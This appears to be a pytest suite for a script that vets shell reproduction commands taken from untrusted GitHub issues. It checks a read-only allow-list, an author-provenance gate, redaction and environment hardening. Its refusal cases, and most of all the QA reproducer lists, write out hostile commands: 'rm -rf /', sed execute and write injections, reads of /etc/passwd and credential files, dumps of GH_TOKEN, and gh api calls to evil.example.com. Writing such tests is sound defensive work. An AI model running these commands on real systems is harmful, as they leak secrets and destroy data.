"""#543 — the shell `repro:` dialect, its allow-list, and its provenance gate.

`verify_issue_evidence.py` has classified `repro:` lines into `http` and
`shell` since 2026-10-13 and reported the shell ones as "executable by the
caller". Measured 2026-10-26: 26 of 123 open issues carried a `repro:` and
**0** were executable by `validate_issue.py`, so the caller never existed and
step 0's premise check ran on nothing.

These tests pin the two things that make executing one safe at all:

  1. the ALLOW-LIST — an issue body is untrusted input, and on a public repo a
     shell `repro:` executed on a host holding a `gh` token is #358's shape
     with an issue form as the entry point;
  2. the PROVENANCE GATE — only an admin/write author's repro is executed, and
     an UNRESOLVED author is not a yes.

Every refusal must also STATE ITS REASON. "0 silently skipped" is #543's
acceptance criterion, because a silent skip is exactly how the http dialect sat
at 0 of 123 for three weeks with nobody noticing.
"""
import importlib.util
import pathlib

import pytest

ROOT = pathlib.Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location(
    "validate_issue", ROOT / "scripts" / "validate_issue.py")
vi = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(vi)


# --------------------------------------------------------------------------
# The allow-list. These are refusals, and a refusal that stops refusing is a
# vulnerability, not a regression in convenience.
# --------------------------------------------------------------------------
@pytest.mark.parametrize("cmd,needle", [
    ('python -c "import os; os.system(\'id\')"', "interpreter"),
    ("python3 -c 'print(1)'", "interpreter"),
    ("uv run python scripts/mutate_behaviour_suite.py", "arbitrary code"),
    ("uvx ruff", "arbitrary code"),
    ("bash -c id", "shell executes arbitrary code"),
    ("sh script.sh", "shell executes arbitrary code"),
    ("node -e 1", "arbitrary code"),
    ("make deploy", "Makefile"),
    ("gsutil cp gs://bucket/x .", "cloud credentials"),
    ("gcloud run deploy", "cloud credentials"),
    ("aws s3 rm s3://b/k", "cloud credentials"),
    ("curl https://example.com", "egress"),
    ("wget https://example.com", "egress"),
    ("docker run alpine id", "arbitrary code"),
    ("ssh host id", "egress"),
])
def test_an_arbitrary_executor_is_refused_by_name_with_a_reason(cmd, needle):
    argv, why = vi.vet_shell(cmd)
    assert argv is None, f"{cmd!r} was going to be EXECUTED"
    assert needle in why, why


@pytest.mark.parametrize("cmd", [
    "grep -rn x src/ | wc -l",
    "grep x f && rm -rf /",
    "grep x f ; id",
    "grep x f > /etc/passwd",
    "grep x f >> out.txt",
    "cat < /etc/passwd",
    "grep x f & id",
])
def test_a_bare_shell_operator_is_refused(cmd):
    """`shell=False` means nothing interprets these, so an unrefused `|` would
    be handed to grep as a FILENAME and fail confusingly. Refusing names it."""
    argv, why = vi.vet_shell(cmd)
    assert argv is None, f"{cmd!r} was going to be EXECUTED"
    assert "shell operator" in why


def test_a_quoted_pipe_is_a_regex_and_is_allowed():
    """The distinction the whole allow-list rests on. `grep -n 'a\\|b' f` is a
    regex alternation, not a pipe — refusing it would have cut the runnable set
    from 10 of 26 to 2, and allowing a BARE pipe would be a shell."""
    argv, why = vi.vet_shell("grep -n 'queries\\|landing pages' f.yml")
    assert argv == ["grep", "-n", "queries\\|landing pages", "f.yml"], argv
    assert "read-only" in why


@pytest.mark.parametrize("cmd,needle", [
    ("sed -i 's/a/b/' f", "read-only"),
    ("sed --in-place 's/a/b/' f", "read-only"),
    ("gh api -X DELETE repos/o/n/issues/1", "read-only"),
    ("gh api --method POST repos/o/n/issues", "read-only"),
    ("gh api repos/o/n/issues -f title=x", "read-only"),
])
def test_a_write_flag_on_an_allowed_command_is_refused(cmd, needle):
    """An allow-list that permits `sed -i` is not read-only."""
    argv, why = vi.vet_shell(cmd)
    assert argv is None, f"{cmd!r} was going to be EXECUTED"
    assert needle in why, why


@pytest.mark.parametrize("cmd", [
    "gh issue close 1",
    "gh issue comment 1 --body x",
    "gh pr merge 1",
    "gh run cancel 1",
    "git push origin main",
    "git commit -am x",
    "git reset --hard",
])
def test_a_write_subcommand_is_refused_even_on_an_allowed_executable(cmd):
    """`gh` and `git` are allowed for READING. `gh issue close` would let an
    issue body close issues as the token's owner."""
    argv, why = vi.vet_shell(cmd)
    assert argv is None, f"{cmd!r} was going to be EXECUTED"
    assert "read-only subcommand" in why, why


@pytest.mark.parametrize("cmd", [
    "gh issue view 475",
    "gh run list --branch main -L 5",
    "git log --oneline -3",
    "git diff --stat main",
])
def test_a_read_only_subcommand_is_allowed(cmd):
    argv, why = vi.vet_shell(cmd)
    assert argv is not None, why


def test_an_unknown_executable_is_refused_because_this_is_an_allow_list():
    argv, why = vi.vet_shell("somebinary --flag")
    assert argv is None
    assert "allow-list, not a" in why


def test_find_exec_and_delete_are_refused():
    for cmd in ("find . -name x -exec rm {} ;", "find . -delete"):
        argv, why = vi.vet_shell(cmd)
        assert argv is None, f"{cmd!r} was going to be EXECUTED"


def test_an_unlexable_repro_is_refused_not_crashed():
    """#463 is a heredoc. A probe that raises on malformed input is a probe
    that cannot sweep a backlog."""
    argv, why = vi.vet_shell("python - <<'P' import os\nprint('x)")
    assert argv is None
    assert "tokenised" in why or "refused" in why


def test_two_commands_pasted_on_one_line_are_refused():
    """#468's shape: `sed -n '39p' a sed -n '130p' b`. Running it feeds the
    second command's NAME to the first as a filename."""
    argv, why = vi.vet_shell("sed -n '39p' a.html sed -n '130p' b.html")
    assert argv is None
    assert "two commands" in why


def test_an_empty_command_is_refused():
    for cmd in ("", "   ", "``"):
        argv, why = vi.vet_shell(cmd)
        assert argv is None
        assert "no command" in why


# --------------------------------------------------------------------------
# The provenance gate (#543 option C). A trusted author's repro is still
# unreviewed code, so the allow-list above applies to EVERYONE; this is the
# second lock, not the only one.
# --------------------------------------------------------------------------
def test_an_outsider_author_is_never_executed(monkeypatch):
    class R:
        returncode = 1
        stdout = "#9  OUTSIDER -- author has read access"
        stderr = ""
    monkeypatch.setattr(vi.subprocess, "run", lambda *a, **k: R())
    trusted, detail = vi.provenance_is_trusted(9, "o/n")
    assert trusted is False
    assert "OUTSIDER" in detail


def test_an_unresolved_author_is_not_a_yes(monkeypatch):
    """exit 2 is "could not resolve". Treating it as trusted is how a revoked
    token turns every issue into a trusted one — resolve_provenance's own
    docstring says so."""
    class R:
        returncode = 2
        stdout = "#9  UNRESOLVED -- permission API 404"
        stderr = ""
    monkeypatch.setattr(vi.subprocess, "run", lambda *a, **k: R())
    trusted, _ = vi.provenance_is_trusted(9, "o/n")
    assert trusted is False


def test_a_trusted_author_is_executed(monkeypatch):
    class R:
        returncode = 0
        stdout = "#9  TRUSTED -- author has write access"
        stderr = ""
    monkeypatch.setattr(vi.subprocess, "run", lambda *a, **k: R())
    trusted, _ = vi.provenance_is_trusted(9, "o/n")
    assert trusted is True


def test_no_repo_cannot_be_resolved_so_it_is_refused():
    trusted, why = vi.provenance_is_trusted(9, "")
    assert trusted is False
    assert "cannot be resolved" in why


# --------------------------------------------------------------------------
# Scoring. The polarity trap: the two dialects state OPPOSITE things, so this
# reports MATCHES-STATED / DIFFERS and never PASS/FAIL.
# --------------------------------------------------------------------------
def test_a_stated_number_still_produced_matches():
    assert vi.score_shell("16", "16\n")[0] is True


def test_a_stated_number_no_longer_produced_differs():
    ok, detail = vi.score_shell("16", "3\n")
    assert ok is False
    assert "16" in detail and "3" in detail


def test_a_comma_grouped_number_is_read_as_one_number():
    assert vi.score_shell("2,410 impressions", "2410\n")[0] is True


def test_contains_and_absent_are_honoured():
    assert vi.score_shell('contains "Lagna"', "the Lagna is")[0] is True
    assert vi.score_shell('contains "Lagna"', "nothing")[0] is False
    assert vi.score_shell('absent "high demand"', "ok")[0] is True
    assert vi.score_shell('absent "high demand"', "high demand")[0] is False


def test_a_prose_expectation_is_unscored_not_guessed():
    """#350's: `-> the string appears in a docstring only`. There is nothing a
    script can compare. Reporting UNSCORED beats a confident coin flip."""
    ok, why = vi.score_shell("the string appears in a docstring only", "3\n")
    assert ok is None
    assert "nothing can be compared" in why


# --------------------------------------------------------------------------
# The two defects this work introduced and the sweep caught. Both are the shape
# that passes forever while protecting nothing.
# --------------------------------------------------------------------------
def test_a_second_probe_on_the_line_does_not_leak_into_the_first_expectation():
    """MEASURED FALSE POSITIVE on #423. `-> 0 grep -n ... -> 234` gave the
    first probe the expectation [0, 234]; the command correctly reported 0 and
    the probe announced DIFFERS "missing [234]" — a drift report on an intact
    premise."""
    line = ('grep -c "verify_hindi_surface" a.yml -> 0 '
            'grep -n "verify_hindi_surface" b.yml -> 234')
    cmd, stated, probes = vi.split_shell_repro(line)
    assert cmd == 'grep -c "verify_hindi_surface" a.yml'
    assert vi._ints(stated) == [0], stated
    assert probes == 2
    assert vi.score_shell(stated, "0\n")[0] is True


def test_the_last_repro_wins_even_when_the_newest_is_a_different_dialect():
    """The original `parse_repro` skipped any non-GET/POST line, so an issue
    whose newest `repro:` was shell but which also carried an older http one
    silently probed the STALE line and reported a verdict on it."""
    text = ("repro: GET /kundli -> 200 contains \"Lagna\"\n\n"
            "repro: grep -c x f.py -> 3\n")
    assert vi.last_repro_line(text).startswith("grep -c x")
    assert vi.parse_repro(text) is None, "the stale http line was still used"


def test_an_http_repro_is_still_parsed_as_before():
    spec = vi.parse_repro('repro: POST /reading birth_date=1990-01-15 '
                          '-> follow -> 200 contains "Lagna" absent "high demand"')
    assert spec["method"] == "POST"
    assert spec["follow"] is True
    assert spec["status"] == 200
    assert spec["contains"] == ["Lagna"]
    assert spec["absent"] == ["high demand"]


# --------------------------------------------------------------------------
# Globbing without a shell.
# --------------------------------------------------------------------------
def test_globs_expand_without_a_shell():
    out = vi.expand_globs(["grep", "-c", "x", "src/astro_ai/templates/learn/*.html"])
    assert len(out) > 4, out
    assert all("*" not in a for a in out[3:]), out


def test_a_glob_matching_nothing_is_left_verbatim():
    """So the command reports its own not-found error instead of silently
    probing fewer files than the issue claimed."""
    out = vi.expand_globs(["grep", "-c", "x", "no/such/dir/*.html"])
    assert out[-1] == "no/such/dir/*.html"


def test_a_flag_is_never_glob_expanded():
    assert vi.expand_globs(["grep", "-E", "a*b", "f"])[1] == "-E"


def test_one_shell_sample_reports_a_timeout_as_unable_to_run(monkeypatch):
    """None, not False. A probe that cannot run is inconclusive; counting it as
    a reproduction sends an engineer after a bug that does not exist."""
    def boom(*a, **k):
        raise vi.subprocess.TimeoutExpired(cmd="x", timeout=1)
    monkeypatch.setattr(vi.subprocess, "run", boom)
    rc, out, note = vi.one_shell_sample(["grep", "x", "f"])
    assert rc is None
    assert "timed out" in note


def test_a_date_is_not_read_as_negative_numbers():
    """MEASURED on #461. `-?\\d` read `2026-10-08T06:57:17` as
    [2026, -10, -8, 6, 57, 17] and #518's output as [10, -6, 4, ...], so the
    comparison ran against numbers that appear nowhere in either side.

    The contract is NOT "every digit is captured" — a digit glued to a letter
    is deliberately skipped so `v3ab31fc3d` contributes nothing. It is:
    no sign, and the SAME tokenisation on both sides, since a number compared
    against a differently-tokenised copy of itself is noise either way."""
    assert all(n >= 0 for n in vi._ints("2026-10-08T06:57:17"))
    assert all(n >= 0 for n in vi._ints("41 of 76 -> 0 of 35 at 92%"))
    assert vi._ints("2026-10-08")[:3] == [2026, 10, 8]
    # identical on both sides is what makes the comparison meaningful
    stamp = "2026-10-08T06:57:17"
    assert vi._ints(f"newest run {stamp}") == vi._ints(f"{stamp} queued")
    assert vi.score_shell(f"newest run {stamp}", f"{stamp}  queued")[0] is True


def test_a_version_like_token_is_not_split_into_numbers():
    """`v3ab31fc3d` and `parts[2]` must not contribute digits that then have to
    be found in the output."""
    assert vi._ints("parts[2]") == [2]
    assert 3 not in vi._ints("sha v3ab31fc3d")


# --------------------------------------------------------------------------
# QA round 1 on #544. Every case below is a reproducer QA ran against the first
# version and EXECUTED: a file written, a program run, a credential printed.
# --------------------------------------------------------------------------
_ATTACKS = [
    # sed's own scripts execute (`e`) and write (`w`)
    "sed -n '1e echo PWN > /tmp/x' README.md",
    "sed -n 's/^/id/e' README.md",
    "sed -n 'w /tmp/x' README.md",
    "sed 's/x/y/w /tmp/x' README.md",
    # the exact-token `-i` ban was walked around by every other spelling
    "sed -i.bak s/a/b/ README.md", "sed -ni p README.md",
    "sed --in-place=.bak s/a/b/ README.md", "sed -Ei s/a/b/ README.md",
    # programs and file writes through allow-listed executables
    "git ls-remote --upload-pack=id .", "git diff --output=/tmp/x HEAD~1",
    "git log --output=/tmp/x", "git log --ext-diff", "git grep -O id x",
    "git diff --no-index /etc/passwd /dev/null", "git -c core.pager=id log",
    "sort -o /tmp/x README.md", "uniq README.md /tmp/x", "rg --pre id x",
    "tail -f README.md", "grep -f /etc/passwd README.md",
    # credentials and the environment
    "jq -n env", "jq -n '$ENV.GH_TOKEN'", "cat .git/config", "cat ./.git/config",
    "cat -- .git/config", "cat gha-creds-x.json", "cat /etc/passwd", "ls /",
    "head -n 5 /proc/self/environ", "cat ../x", "cat src/../.git/config",
    # gh write flags in every spelling the exact-token ban missed
    "gh api --method=DELETE repos/o/n/issues/1", "gh api -XDELETE repos/o/n/issues/1",
    "gh api repos/o/n -fa=b", "gh api repos/o/n --field=a=b",
    "gh api repos/o/n --hostname evil.example.com", "gh api graphql",
]


@pytest.mark.parametrize("cmd", _ATTACKS)
def test_every_qa_round_1_reproducer_is_refused(cmd):
    argv, why = vi.vet_shell(cmd)
    assert argv is None, f"{cmd!r} would be EXECUTED"
    assert why


@pytest.mark.parametrize("cmd", [
    "grep -c verify README.md", "grep -rn '/health' src", "gh issue view 475",
    "git log --oneline -3", "git grep -c foo -- src", "sed -n '10,20p' README.md",
    "sed -n '/foo/p' README.md", "head -5 README.md",
    "gh api repos/o/n/issues --jq '.[].number'",
])
def test_the_flag_allow_list_still_lets_the_real_backlog_commands_through(cmd):
    argv, why = vi.vet_shell(cmd)
    assert argv is not None, why


def test_a_glob_cannot_launder_a_credential_file_past_the_vet(tmp_path, monkeypatch):
    """`cat gha-c*` is a harmless glob to the vet and the credential file after
    expansion. The expansion is re-checked."""
    monkeypatch.setattr(vi, "ROOT", tmp_path)
    (tmp_path / "gha-creds-abc.json").write_text("{}")
    argv, _ = vi.vet_shell("cat gha-c*")
    assert argv is not None  # passes the vet: it is only a glob
    reason = vi.check_expanded(argv, vi.expand_globs(argv))
    assert reason and "credential" in reason


def test_a_glob_cannot_expand_into_an_option(tmp_path, monkeypatch):
    monkeypatch.setattr(vi, "ROOT", tmp_path)
    (tmp_path / "-o").write_text("")
    argv, _ = vi.vet_shell("cat ?o")
    assert vi.check_expanded(argv, vi.expand_globs(argv))


def test_a_credential_shape_is_redacted_before_it_is_printed():
    out = vi.redact("origin https://x-access-token:ghs_abcdefghijklmnop1234@github.com/o/n "
                    "and ghp_abcdefghijklmnopqrstuv")
    assert "ghs_" not in out and "ghp_" not in out and "x-access-token:" not in out


def test_the_child_environment_carries_no_token_except_to_gh(monkeypatch):
    monkeypatch.setenv("GH_TOKEN", "sentinel-token")
    monkeypatch.setenv("SOME_SECRET", "sentinel-secret")
    assert "GH_TOKEN" not in vi._child_env("cat")
    assert "SOME_SECRET" not in vi._child_env("cat")
    assert vi._child_env("gh")["GH_TOKEN"] == "sentinel-token"


def test_recursive_grep_is_told_to_skip_the_secret_files():
    argv = vi._hardened(["grep", "-rn", "x", "."])
    assert "--exclude-dir=.git" in argv and "--exclude=gha-creds*" in argv
    assert vi._hardened(["grep", "-c", "x", "f"]) == ["grep", "-c", "x", "f"]


# --- the WIRING. The first round's tests covered the helpers only; forcing
# `trusted = True`, `if False:` and a default-on bypass flag all left the suite
# green. These drive main() with the subprocess boundary faked.
class _Boundary:
    """Fake `gh issue view`, the provenance resolver, and the repro child."""

    def __init__(self, monkeypatch, body, comments=(), prov_rc=0):
        self.ran = []
        self.prov_rc = prov_rc
        issue = {"body": body, "comments": [{"body": c} for c in comments]}
        import json as _json

        class R:
            def __init__(self, rc=0, out="", err=""):
                self.returncode, self.stdout, self.stderr = rc, out, err

        def fake_run(argv, *a, **k):
            if argv[:3] == ["gh", "issue", "view"]:
                return R(0, _json.dumps(issue))
            if any(str(x).endswith("resolve_provenance.py") for x in argv):
                return R(self.prov_rc, "#9  PROVENANCE -- fixture")
            self.ran.append(argv)
            return R(0, "7\n")

        monkeypatch.setattr(vi.subprocess, "run", fake_run)


def _main(monkeypatch, capsys, argv=("9", "--repo", "o/n")):
    monkeypatch.setattr(vi.sys, "argv", ["validate_issue.py", *argv])
    rc = vi.main()
    return rc, capsys.readouterr().out


BODY = "x\nrepro: grep -c verify README.md -> 7\n"


def test_trusted_author_reaches_execution_and_matches(monkeypatch, capsys):
    b = _Boundary(monkeypatch, BODY, prov_rc=0)
    rc, out = _main(monkeypatch, capsys)
    assert rc == 0 and "MATCHES-STATED" in out
    assert b.ran, "a trusted author's vetted repro must run"


@pytest.mark.parametrize("prov_rc", [1, 2, 7])
def test_outsider_unresolved_or_odd_provenance_runs_nothing_and_exits_6(
        monkeypatch, capsys, prov_rc):
    b = _Boundary(monkeypatch, BODY, prov_rc=prov_rc)
    rc, out = _main(monkeypatch, capsys)
    assert rc == 6 and "REFUSED" in out
    assert b.ran == [], f"the child ran for provenance rc={prov_rc}: {b.ran}"


def test_a_bot_style_refusal_and_a_missing_repo_run_nothing(monkeypatch, capsys):
    b = _Boundary(monkeypatch, BODY, prov_rc=0)
    rc, out = _main(monkeypatch, capsys, argv=("9",))
    monkeypatch.delenv("GH_REPO", raising=False)
    rc, out = _main(monkeypatch, capsys, argv=("9", "--repo", ""))
    assert rc == 6 and b.ran == []


def test_there_is_no_flag_that_skips_the_provenance_check(monkeypatch, capsys):
    b = _Boundary(monkeypatch, BODY, prov_rc=1)
    with pytest.raises(SystemExit):
        _main(monkeypatch, capsys, argv=("9", "--repo", "o/n", "--allow-untrusted-shell"))
    assert b.ran == []


def test_a_shell_repro_in_a_comment_never_executes_under_the_authors_gate(
        monkeypatch, capsys):
    """Anyone can comment on a public issue; provenance covers the AUTHOR.
    QA wrote a sentinel file through exactly this."""
    evil = "repro: sed -n '1e echo PWN > /tmp/x' README.md -> 1"
    b = _Boundary(monkeypatch, BODY, comments=[evil], prov_rc=0)
    rc, out = _main(monkeypatch, capsys)
    assert rc == 6 and "COMMENT" in out
    assert b.ran == []


def test_a_harmless_newer_shell_comment_also_does_not_run(monkeypatch, capsys):
    b = _Boundary(monkeypatch, BODY, comments=["repro: grep -c x README.md -> 1"])
    rc, _ = _main(monkeypatch, capsys)
    assert rc == 6 and b.ran == []


def test_shell_verdicts_never_exit_1_so_they_can_never_read_as_cannot_reproduce(
        monkeypatch, capsys):
    """Step 0 closes ONLY on exit 1 / CANNOT-REPRODUCE. A shell verdict has no
    polarity, so none of them may produce it."""
    codes = set()
    for body, out_ in [(BODY, "7\n"), ("repro: grep -c verify README.md -> 9\n", "7\n"),
                       ("repro: python -c 1 -> 1\n", "")]:
        _Boundary(monkeypatch, body, prov_rc=0)
        rc, out = _main(monkeypatch, capsys)
        codes.add(rc)
        assert "CANNOT-REPRODUCE" not in out
    assert 1 not in codes and codes == {0, 5, 6}


# --- backlog coverage ------------------------------------------------------
def test_the_bold_bullet_form_agent_discover_writes_is_found():
    """26 of the 53 issues verify_issue_evidence counts as carrying a repro
    used `- **repro:** ...`, and exited NO-REPRO silently."""
    t = "- **gsc:** n/a\n- **repro:** `grep -c x README.md` -> 3\n- **ga4:** n/a"
    assert vi.last_repro_line(t) == "`grep -c x README.md` -> 3"
    assert vi.last_repro_line("repro: grep -c x f -> 3") == "grep -c x f -> 3"


def test_a_for_loop_pasted_after_the_first_probe_does_not_pollute_its_expectation():
    """#466: the second probe's `for n in 739 740 741 742; do` was read as the
    first probe's expectation, so an intact premise reported DIFFERS."""
    cmd, stated, probes = vi.split_shell_repro(
        'grep -n "^| 2026-10-18" ARCHITECTURE.md -> 5 rows, 4 share a title '
        'for n in 739 740 741 742; do grep -c x f; done')
    assert "739" not in stated and "5 rows" in stated and probes >= 2


def test_prose_containing_for_is_not_a_second_probe():
    _, stated, probes = vi.split_shell_repro("grep -c x f -> 5 matches for the old name 12")
    assert "12" in stated and probes == 1


# --------------------------------------------------------------------------
# QA round 2 on #544 -- reproducers that still executed against 47762ba.
# --------------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "grep -ex gha-creds-x.json", "grep -ex linkcfg", "grep -R S .",
    "grep --dereference-recursive S .", "git diff /dev/null gha-creds-x.json",
    "git diff /dev/null /etc/passwd", "cat .local/notes.txt",
    "gh api http://127.0.0.1:8/x.json --jq '$ENV.GH_TOKEN|@base64'",
    "gh api repos/o/n --jq env", "gh api repos/o/n --jq='env.GH_TOKEN'",
    "gh api repos/o/n --jq input_filename", "gh api repos/o/n -q debug",
])
def test_every_qa_round_2_reproducer_is_refused(cmd):
    argv, why = vi.vet_shell(cmd)
    assert argv is None, f"{cmd!r} would be EXECUTED"


def test_a_user_include_cannot_override_the_injected_excludes(tmp_path, monkeypatch):
    """GNU grep applies the LAST matching include/exclude. Real grep, real files."""
    monkeypatch.setattr(vi, "ROOT", tmp_path)
    (tmp_path / "gha-creds-x.json").write_text("SENTINEL\n")
    (tmp_path / "ok.txt").write_text("SENTINEL\n")
    (tmp_path / ".local").mkdir()
    (tmp_path / ".local" / "n.txt").write_text("SENTINEL\n")
    for flag in ("--include=*", "--include=gha-creds*"):
        _, out, _ = vi.one_shell_sample(["grep", "-r", flag, "SENTINEL", "."])
        assert "gha-creds" not in out and ".local" not in out, (flag, out)
    assert vi._hardened(["grep", "-r", "x", "--", "."])[-2:] == ["--", "."]


def test_the_vetted_gh_jq_filters_the_backlog_uses_still_pass():
    for cmd in ("gh api repos/o/n/issues --jq '.[].number'",
                "gh issue list --json number --jq 'length'"):
        assert vi.vet_shell(cmd)[0] is not None


def test_the_child_really_runs_without_a_shell_and_without_the_token(
        monkeypatch, capsys):
    """Round 2 mutated `env=_child_env(..)` -> None and `shell=False` -> True and
    the suite stayed green: the units were tested, the call site was not."""
    monkeypatch.setenv("GH_TOKEN", "sentinel-token")
    seen = {}

    class R:
        returncode, stdout, stderr = 0, "7\n", ""

    def fake_run(argv, *a, **k):
        seen["kwargs"] = k
        return R()

    monkeypatch.setattr(vi.subprocess, "run", fake_run)
    vi.one_shell_sample(["grep", "-c", "x", "README.md"])
    assert seen["kwargs"]["shell"] is False
    assert "GH_TOKEN" not in seen["kwargs"]["env"]


def test_run_shell_refuses_a_glob_that_expands_to_a_credential(
        tmp_path, monkeypatch, capsys):
    """The `check_expanded` call in _run_shell: removing it left the suite green."""
    monkeypatch.setattr(vi, "ROOT", tmp_path)
    (tmp_path / "gha-creds-abc.json").write_text("{}")
    b = _Boundary(monkeypatch, "repro: cat gha-c* -> 1\n", prov_rc=0)
    rc, out = _main(monkeypatch, capsys)
    assert rc == 6 and "forbidden path" in out
    assert b.ran == []


def test_authorization_headers_are_redacted():
    assert "basic" not in vi.redact("extraheader = AUTHORIZATION: basic eHh4Onl5eXl5eXl5")
